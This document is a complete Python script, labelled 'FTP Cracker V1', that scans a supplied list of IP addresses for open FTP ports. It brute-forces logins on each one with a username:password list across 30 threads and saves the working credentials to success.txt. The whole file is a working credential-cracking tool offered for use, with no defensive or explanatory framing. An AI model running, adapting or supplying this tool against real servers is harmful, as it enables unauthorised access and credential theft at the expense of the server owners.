from multiprocessing.pool import ThreadPool
from ftplib import FTP
from colorama import init,Fore
import socket
init()

def check(ip):
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   if sock.connect_ex((ip, 21)) == 0:
      cracker(ip)

def cracker(ip):
 for line in userpass:
   try:
    username = line.split(':')[0]
    password = line.split(':')[1]
    print(Fore.GREEN + "[*] " + Fore.WHITE + "Trying " + ip + " with username: " + username + " and password: " + password)
    ftp = FTP(ip)
    ftp.login(user=username, passwd = password)
    print(Fore.GREEN + "[+] Found " + ip + " with username: " + username + " and password: " + password)
    open("success.txt", "a+").write(ip + ":" + username + ":" + password + "\n")
    break
   except:
    pass


print(Fore.GREEN+"""
                               
 _____ _____ _____            
|   __|_   _|  _  |            
|   __| | | |   __|            
|__|    |_| |__|               
                               
                               
 _____             _           
|     |___ ___ ___| |_ ___ ___ 
|   --|  _| .'|  _| '_| -_|  _|
|_____|_| |__,|___|_,_|___|_| """+Fore.WHITE+""" V1
                               
      Created By Neoax

""")

ips = []
userpass = []

with open(raw_input(Fore.GREEN+"[*] IP List : "+Fore.WHITE), "r") as list:
  for a in list:
    ips.append(a.replace('\n',''))
with open(raw_input(Fore.GREEN+"[*] User:Pass List: "+Fore.WHITE), "r") as list2:
  for i in list2:
    userpass.append(i.replace('\n',''))

print("")
p = ThreadPool(30)
p.map(check, ips)
